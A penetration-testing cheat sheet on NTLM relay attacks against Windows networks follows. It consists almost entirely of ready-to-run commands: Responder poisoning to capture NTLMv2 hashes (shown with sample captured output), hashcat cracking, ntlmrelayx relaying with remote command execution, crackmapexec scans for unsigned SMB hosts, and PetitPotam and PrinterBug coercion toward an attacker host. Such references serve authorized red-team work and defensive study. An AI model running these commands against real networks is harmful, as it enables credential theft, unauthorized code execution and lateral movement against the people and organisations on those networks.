# NTLM Relay & Responder

### Capture hashes with Responder

Poison LLMNR/NBT-NS/mDNS — Capture NTLMv2 hashes on the network

```bash
sudo responder -I eth0 -dwPv
```

<details>
<summary>Example Output</summary>

```
[SMB] NTLMv2-SSP Client   : 10.10.10.50
[SMB] NTLMv2-SSP Username : DOMAIN\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::DOMAIN:1122334455667788:ABC123...
```
</details>

---

### Crack captured NTLMv2 hashes

Hashcat mode 5600

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

### NTLM relay with ntlmrelayx

Relay captured auth to another host — Don't crack, relay instead

```bash
# Disable SMB and HTTP in /etc/responder/Responder.conf
# SMB = Off, HTTP = Off

impacket-ntlmrelayx -tf targets.txt -smb2support
# Or execute command:
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

---

### Find hosts without SMB signing

Required for relay attacks — These are valid relay targets

```bash
crackmapexec smb $SUBNET/24 --gen-relay-list relay_targets.txt
# "Message signing enabled but not required" = relay target
```

---

### Force authentication (coercion)

Trigger authentication to your Responder

```bash
# PetitPotam (unauthenticated):
python3 PetitPotam.py $LHOST $DC_IP

# PrinterBug / SpoolSample:
python3 printerbug.py domain/user:password@$TARGET $LHOST
```

---
